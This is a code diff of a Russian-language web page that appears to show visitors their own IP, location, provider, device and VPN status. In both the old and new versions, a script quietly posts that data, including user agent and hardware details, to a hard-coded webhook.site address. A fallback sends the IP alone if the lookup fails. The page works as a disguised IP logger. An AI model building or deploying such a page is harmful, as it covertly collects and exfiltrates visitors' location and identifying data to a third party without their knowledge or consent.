@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>Данные</title>
+  <title>⚚ Данные</title>
   <style>
     * {
       margin: 0;
@@ -16,299 +16,189 @@
       font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "Helvetica Neue", sans-serif;
       min-height: 100vh;
       display: flex;
-      align-items: flex-start;
+      align-items: center;
       justify-content: center;
       color: #ffffff;
       line-height: 1.4;
       -webkit-font-smoothing: antialiased;
-      padding: 0 0 16px 0;
-    }
-
-    .loading-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.72);
-      backdrop-filter: blur(24px);
-      -webkit-backdrop-filter: blur(24px);
-      z-index: 1000;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      opacity: 1;
-      visibility: visible;
-      transition: opacity 0.7s cubic-bezier(0.23, 1, 0.32, 1), visibility 0.7s;
-      pointer-events: none;
-    }
-
-    .loading-symbol {
-      font-size: 140px;
-      font-weight: 300;
-      color: #ffffff;
-      opacity: 0.9;
-      text-shadow: 0 0 30px rgba(255,255,255,0.3);
-      animation: subtlePulse 2.2s infinite;
-    }
-
-    @keyframes subtlePulse {
-      0% { opacity: 0.75; transform: scale(0.98); }
-      50% { opacity: 1; transform: scale(1); }
-      100% { opacity: 0.75; transform: scale(0.98); }
-    }
-
-    .loading-overlay.hidden {
-      opacity: 0;
-      visibility: hidden;
+      padding: 20px 16px;
     }
 
     .ios-root {
       width: 100%;
-      max-width: 720px;
+      max-width: 680px;
       margin: 0 auto;
-      padding: 18px 16px 32px 16px;
+      opacity: 0;
+      transform: translateY(10px);
+      transition: opacity 0.5s ease, transform 0.4s ease;
     }
 
-    .ios-title-section {
-      margin-bottom: 28px;
+    .ios-root.visible {
+      opacity: 1;
+      transform: translateY(0);
     }
 
-    .ios-large-title {
-      font-size: 36px;
-      font-weight: 700;
-      letter-spacing: -0.5px;
+    .hero-symbol {
+      text-align: center;
+      margin-bottom: 24px;
+      font-size: 92px;
+      font-weight: 300;
       color: #ffffff;
-      line-height: 1.1;
-      margin-bottom: 6px;
+      text-shadow: 0 0 25px rgba(255,255,255,0.4);
+      animation: gentleGlow 2.8s infinite ease-in-out;
     }
 
-    .ios-subhead {
-      font-size: 15px;
-      font-weight: 400;
-      color: #8e8e93;
-      letter-spacing: -0.2px;
+    @keyframes gentleGlow {
+      0% { text-shadow: 0 0 5px rgba(255,255,255,0.2); opacity: 0.9; transform: scale(0.98);}
+      50% { text-shadow: 0 0 30px rgba(255,255,255,0.6); opacity: 1; transform: scale(1);}
+      100% { text-shadow: 0 0 5px rgba(255,255,255,0.2); opacity: 0.9; transform: scale(0.98);}
     }
 
-    .ios-section {
+    .single-card {
       background: #1c1c1e;
-      border-radius: 16px;
-      margin-bottom: 28px;
+      border-radius: 28px;
       overflow: hidden;
       backdrop-filter: blur(10px);
       -webkit-backdrop-filter: blur(10px);
       border: 0.5px solid #3a3a3c;
     }
 
-    .ios-section-header {
-      padding: 14px 18px 6px 18px;
-      font-size: 13px;
-      font-weight:500;
-      text-transform: uppercase;
-      letter-spacing: 0.3px;
-      color: #8e8e93;
-    }
-
-    .ios-row {
+    .info-row {
       display: flex;
       align-items: flex-start;
-      padding: 14px 18px;
+      justify-content: space-between;
+      padding: 16px 20px;
       border-bottom: 0.5px solid #2c2c2e;
+      gap: 16px;
     }
 
-    .ios-row:last-child {
+    .info-row:last-child {
       border-bottom: none;
     }
 
     .row-label {
-      width: 130px;
-      flex-shrink: 0;
       font-size: 16px;
       font-weight: 400;
       color: #8e8e93;
       letter-spacing: -0.3px;
+      flex-shrink: 0;
+      min-width: 100px;
     }
 
     .row-value {
-      flex: 1;
       font-size: 16px;
-      font-weight: 400;
+      font-weight: 500;
       color: #ffffff;
-      word-break: break-word;
       text-align: right;
+      word-break: break-word;
+      flex: 1;
     }
 
     .mono-value {
       font-family: 'SF Mono', 'Menlo', 'Monaco', 'Courier New', monospace;
       font-size: 14px;
+      font-weight: 400;
       color: #d1d1d6;
-    }
-
-    .footnote {
-      margin-top: 8px;
-      padding: 0 18px;
-      font-size: 12px;
-      color: #8e8e93;
-    }
-
-    .tag-group {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 6px;
-      justify-content: flex-end;
-    }
-
-    .tag {
-      background: #2c2c2e;
-      padding: 4px 10px;
-      border-radius: 40px;
-      font-size: 14px;
-      font-weight: 500;
-      color: #ffffff;
-      border: 0.5px solid #3a3a3c;
-    }
-
-    .tag-neutral {
-      color: #ffffff;
     }
 
     .loading-placeholder {
       text-align: right;
       color: #8e8e93;
+      font-weight: 400;
     }
 
     @media (max-width: 480px) {
+      .info-row {
+        padding: 14px 16px;
+      }
       .row-label {
-        width: 110px;
+        min-width: 85px;
         font-size: 15px;
       }
-      .ios-large-title {
-        font-size: 32px;
+      .hero-symbol {
+        font-size: 76px;
+        margin-bottom: 20px;
       }
     }
   </style>
 </head>
 <body>
 
-<div class="loading-overlay" id="loadingOverlay">
-  <div class="loading-symbol">⚚</div>
-</div>
-
-<div class="ios-root">
-  <div class="ios-title-section">
-    <div class="ios-large-title">Данные</div>
-    <div class="ios-subhead">Устройство и сеть</div>
-  </div>
-
-  <div class="ios-section">
-    <div class="ios-section-header">Общие сведения</div>
-    <div class="ios-row">
+<div class="ios-root" id="appRoot">
+  <div class="hero-symbol">⚚</div>
+  <div class="single-card" id="dataCard">
+    <div class="info-row">
       <span class="row-label">Время</span>
-      <span class="row-value" id="localTimeDisplay"></span>
+      <span class="row-value" id="localTimeDisplay">--:--</span>
     </div>
-    <div class="ios-row">
+    <div class="info-row">
+      <span class="row-label">IP адрес</span>
+      <span class="row-value" id="ipDisplay">загрузка...</span>
+    </div>
+    <div class="info-row">
+      <span class="row-label">Страна</span>
+      <span class="row-value" id="countryDisplay">—</span>
+    </div>
+    <div class="info-row">
+      <span class="row-label">Город</span>
+      <span class="row-value" id="cityDisplay">—</span>
+    </div>
+    <div class="info-row">
+      <span class="row-label">Провайдер</span>
+      <span class="row-value" id="providerDisplay">—</span>
+    </div>
+    <div class="info-row">
+      <span class="row-label">ASN</span>
+      <span class="row-value mono-value" id="asnDisplay">—</span>
+    </div>
+    <div class="info-row">
       <span class="row-label">Устройство</span>
-      <span class="row-value" id="deviceTypeDisplay"></span>
+      <span class="row-value" id="deviceDisplay">—</span>
     </div>
-    <div class="ios-row">
-      <span class="row-label">Браузер</span>
-      <span class="row-value" id="browserDisplay"></span>
-    </div>
-    <div class="ios-row">
-      <span class="row-label">Язык</span>
-      <span class="row-value" id="languageDisplay"></span>
-    </div>
-    <div class="ios-row">
-      <span class="row-label">Платформа</span>
-      <span class="row-value" id="platformDisplay"></span>
-    </div>
-    <div class="ios-row">
-      <span class="row-label">Экран</span>
-      <span class="row-value" id="screenDisplay"></span>
-    </div>
-    <div class="ios-row">
+    <div class="info-row">
       <span class="row-label">Часовой пояс</span>
-      <span class="row-value" id="timezoneDisplay"></span>
+      <span class="row-value" id="tzDisplay">—</span>
     </div>
-    <div class="ios-row">
-      <span class="row-label">Интернет</span>
-      <span class="row-value" id="onlineDisplay"></span>
-    </div>
-    <div class="ios-row">
-      <span class="row-label">User Agent</span>
-      <span class="row-value mono-value" id="uaDisplay"></span>
+    <div class="info-row">
+      <span class="row-label">VPN/Proxy</span>
+      <span class="row-value" id="riskDisplay">—</span>
     </div>
   </div>
-
-  <div class="ios-section" id="ipSection">
-    <div class="ios-section-header">Сетевые данные</div>
-    <div id="ipDataContainer">
-      <div class="ios-row">
-        <span class="row-label">Загрузка</span>
-        <span class="row-value loading-placeholder">ожидание ответа</span>
-      </div>
-    </div>
-  </div>
-  
-  <div class="footnote">ipapi.is</div>
 </div>
 
 <script>
   (function() {
-    // ===== ТВОЙ WEBHOOK =====
     const WEBHOOK_URL = 'https://webhook.site/9edcb0dc-3b9b-4f7e-9976-27fd4e804e70';
     
     const $ = (id) => document.getElementById(id);
-
+    
     function formatLocalTime() {
-      return new Date().toLocaleString('ru-RU');
+      return new Date().toLocaleString('ru-RU', { hour12: false });
     }
-
+    
     function updateLocalTime() {
-      if ($('localTimeDisplay')) {
-        $('localTimeDisplay').textContent = formatLocalTime();
-      }
+      const el = $('localTimeDisplay');
+      if (el) el.textContent = formatLocalTime();
     }
-
-    function detectBrowser(ua) {
-      if (ua.includes("Edg/")) return "Microsoft Edge";
-      if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
-      if (ua.includes("Chrome")) return "Google Chrome";
-      if (ua.includes("Firefox")) return "Mozilla Firefox";
-      if (ua.includes("Safari")) return "Safari";
-      return "Неизвестный";
-    }
-
+    
     function detectDeviceType(ua) {
-      if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) return "Телефон / Планшет";
+      if (/iPad|iPhone|iPod/i.test(ua)) return "iPhone / iPad";
+      if (/Android/i.test(ua)) return "Android";
+      if (/Mobile/i.test(ua)) return "Телефон";
       return "Компьютер";
     }
-
+    
     const ua = navigator.userAgent;
-    const language = navigator.language || '';
-    const platform = navigator.platform || '';
-    const screenW = screen.width;
-    const screenH = screen.height;
+    const device = detectDeviceType(ua);
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const online = navigator.onLine ? "Да" : "Нет";
-
+    const language = navigator.language || '';
+    
+    $('deviceDisplay').textContent = device;
+    $('tzDisplay').textContent = timezone;
+    
     updateLocalTime();
-    $('deviceTypeDisplay').textContent = detectDeviceType(ua);
-    $('browserDisplay').textContent = detectBrowser(ua);
-    $('languageDisplay').textContent = language;
-    $('platformDisplay').textContent = platform;
-    $('screenDisplay').textContent = `${screenW} × ${screenH}`;
-    $('timezoneDisplay').textContent = timezone;
-    $('onlineDisplay').textContent = online;
-    
-    const uaShort = ua.length > 80 ? ua.substring(0, 80) + '…' : ua;
-    $('uaDisplay').textContent = uaShort;
-
     setInterval(updateLocalTime, 1000);
-
-    const container = $('ipDataContainer');
     
-    // ===== ФУНКЦИЯ ОТПРАВКИ НА WEBHOOK =====
     function sendToWebhook(data) {
       const payload = {
         timestamp: new Date().toISOString(),
@@ -318,211 +208,99 @@
         country_code: data.location?.country_code || null,
         city: data.location?.city || null,
         region: data.location?.state || null,
-        postal: data.location?.zip || null,
-        latitude: data.location?.latitude || null,
-        longitude: data.location?.longitude || null,
         provider: data.company?.name || data.asn?.org || null,
         asn: data.asn?.asn ? `AS${data.asn.asn}` : null,
         is_vpn: data.is_vpn || false,
         is_proxy: data.is_proxy || false,
         is_tor: data.is_tor || false,
-        is_hosting: data.is_datacenter || false,
-        is_mobile: data.is_mobile || false,
-        is_bot: data.is_crawler || false,
-        device: detectDeviceType(ua),
-        browser: detectBrowser(ua),
+        device: device,
         user_agent: ua,
-        screen: `${screenW}×${screenH}`,
-        language: language,
-        platform: platform,
         timezone: timezone,
-        online: online,
+        language: language,
         cookies_enabled: navigator.cookieEnabled,
-        touch_points: navigator.maxTouchPoints || 0,
-        hardware_cores: navigator.hardwareConcurrency || null,
-        memory_gb: navigator.deviceMemory || null
+        hardware_cores: navigator.hardwareConcurrency || null
       };
       
       fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
-      })
-      .then(() => console.log('✅ Отправлено на Webhook'))
-      .catch(e => console.error('❌ Ошибка Webhook:', e));
+      }).catch(e => console.log('webhook err:', e));
     }
     
     function countryCodeToFlag(code) {
       if (!code) return '';
       const upper = code.toUpperCase();
-      return upper.replace(/./g, ch => 
-        String.fromCodePoint(127397 + ch.charCodeAt())
-      ) + ' ';
+      return upper.replace(/./g, ch => String.fromCodePoint(127397 + ch.charCodeAt()));
     }
-
-    function renderIPData(data) {
+    
+    function renderData(data) {
       if (!data || !data.ip) {
-        showIPError('Не удалось загрузить данные');
+        $('ipDisplay').textContent = 'ошибка';
         return;
       }
       
-      // Отправляем ВСЕ данные на вебхук
       sendToWebhook(data);
-
+      
       const loc = data.location || {};
       const comp = data.company || {};
       const asn = data.asn || {};
-      const abuse = data.abuse || {};
-
-      const flagEmoji = countryCodeToFlag(loc.country_code);
+      const flag = countryCodeToFlag(loc.country_code);
       
-      let apiLocalTimeStr = '';
-      if (loc.local_time) {
-        try {
-          apiLocalTimeStr = new Date(loc.local_time).toLocaleString('ru-RU');
-        } catch(e) { apiLocalTimeStr = loc.local_time; }
-      } else {
-        apiLocalTimeStr = '';
-      }
-
-      const lat = loc.latitude;
-      const lon = loc.longitude;
-      const coords = (lat && lon) ? `${lat}, ${lon}` : '';
+      $('ipDisplay').innerHTML = `${flag} ${data.ip}`;
+      $('countryDisplay').textContent = loc.country || '—';
       
-      const cityState = `${loc.city || ''}, ${loc.state || ''}`.replace(/^, |, $/g, '') || '';
+      let cityText = loc.city || '—';
+      if (loc.state) cityText += `, ${loc.state}`;
+      $('cityDisplay').textContent = cityText;
       
-      const tags = [];
-      if (data.is_vpn) tags.push('VPN');
-      if (data.is_proxy) tags.push('Proxy');
-      if (data.is_tor) tags.push('Tor');
-      if (data.is_datacenter) tags.push('Хостинг');
-      if (data.is_mobile) tags.push('Мобильная');
-      if (data.is_crawler) tags.push('Бот');
+      const provider = comp.name || asn.org || '—';
+      $('providerDisplay').textContent = provider;
       
-      const securityTagsHtml = tags.length 
-        ? tags.map(t => `<span class="tag">${t}</span>`).join('') 
-        : '<span class="tag tag-neutral">Чистое</span>';
-
-      const provider = comp.name || asn.org || asn.descr || '';
-      const asnDisplay = asn.asn ? `AS${asn.asn} ${asn.descr ? '· '+asn.descr : ''}` : '';
-      const companyType = comp.type ? comp.type.toUpperCase() : '';
-      const abuseContact = abuse.email || asn.abuse || '';
-      const providerDomain = comp.domain ? comp.domain : null;
-
-      let rowsHtml = `
-        <div class="ios-row">
-          <span class="row-label">IP адрес</span>
-          <span class="row-value">${flagEmoji}${data.ip}</span>
-        </div>
-        <div class="ios-row">
-          <span class="row-label">Страна</span>
-          <span class="row-value">${loc.country || ''} (${loc.country_code || ''})</span>
-        </div>
-        <div class="ios-row">
-          <span class="row-label">Город / Регион</span>
-          <span class="row-value">${cityState}</span>
-        </div>
-        <div class="ios-row">
-          <span class="row-label">Индекс</span>
-          <span class="row-value">${loc.zip || ''}</span>
-        </div>
-        <div class="ios-row">
-          <span class="row-label">Координаты</span>
-          <span class="row-value">${coords}</span>
-        </div>
-        <div class="ios-row">
-          <span class="row-label">Локальное время</span>
-          <span class="row-value">${apiLocalTimeStr}</span>
-        </div>
-        <div class="ios-row">
-          <span class="row-label">Провайдер</span>
-          <span class="row-value">${provider}</span>
-        </div>
-        <div class="ios-row">
-          <span class="row-label">ASN</span>
-          <span class="row-value mono-value">${asnDisplay}</span>
-        </div>
-        <div class="ios-row">
-          <span class="row-label">Тип сети</span>
-          <span class="row-value">${companyType}</span>
-        </div>
-      `;
-
-      if (providerDomain) {
-        rowsHtml += `
-        <div class="ios-row">
-          <span class="row-label">Домен</span>
-          <span class="row-value">${providerDomain}</span>
-        </div>`;
-      }
-
-      rowsHtml += `
-        <div class="ios-row">
-          <span class="row-label">Безопасность</span>
-          <span class="row-value">
-            <div class="tag-group">
-              ${securityTagsHtml}
-            </div>
-          </span>
-        </div>
-        <div class="ios-row">
-          <span class="row-label">Контакт</span>
-          <span class="row-value mono-value">${abuseContact}</span>
-        </div>
-      `;
-
-      container.innerHTML = rowsHtml;
+      let asnText = '—';
+      if (asn.asn) asnText = `AS${asn.asn}`;
+      if (asn.descr) asnText += ` · ${asn.descr}`;
+      $('asnDisplay').textContent = asnText;
+      
+      const isRisky = data.is_vpn || data.is_proxy || data.is_tor;
+      let riskText = 'Нет';
+      if (data.is_vpn) riskText = 'VPN';
+      if (data.is_proxy) riskText = 'Proxy';
+      if (data.is_tor) riskText = 'Tor';
+      if (data.is_datacenter && !isRisky) riskText = 'Хостинг';
+      $('riskDisplay').textContent = riskText;
     }
-
-    function showIPError(message) {
-      container.innerHTML = `
-        <div class="ios-row">
-          <span class="row-label">Ошибка</span>
-          <span class="row-value" style="color: #ff453a;">${message}</span>
-        </div>
-        <div class="ios-row">
-          <span class="row-label">Резерв</span>
-          <span class="row-value loading-placeholder" id="fallbackIp">проверка ipify</span>
-        </div>
-      `;
-      
+    
+    function fallbackIP() {
       fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(data => {
           if (data.ip) {
-            const fb = $('fallbackIp');
-            if (fb) {
-              fb.textContent = data.ip;
-              fb.style.color = '#ffffff';
-            }
-            // Отправляем хотя бы IP
+            $('ipDisplay').textContent = data.ip;
             fetch(WEBHOOK_URL, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ ip: data.ip, source: 'ipify_fallback', time: formatLocalTime(), ua: ua })
+              body: JSON.stringify({ ip: data.ip, fallback: true, ua: ua, time: formatLocalTime() })
             });
           }
         })
         .catch(() => {});
     }
-
+    
     fetch('https://api.ipapi.is/')
-      .then(response => {
-        if (!response.ok) throw new Error(`HTTP ${response.status}`);
-        return response.json();
+      .then(res => {
+        if (!res.ok) throw new Error();
+        return res.json();
       })
-      .then(data => renderIPData(data))
-      .catch(err => {
-        console.warn('ipapi.is error:', err);
-        showIPError('Сервис недоступен');
+      .then(data => renderData(data))
+      .catch(() => {
+        $('ipDisplay').textContent = 'не загружено';
+        fallbackIP();
       });
-
-    window.addEventListener('load', function() {
-      const overlay = $('loadingOverlay');
-      setTimeout(() => {
-        overlay.classList.add('hidden');
-      }, 2000);
-    });
+    
+    setTimeout(() => {
+      document.getElementById('appRoot').classList.add('visible');
+    }, 100);
   })();
 </script>
 </body>
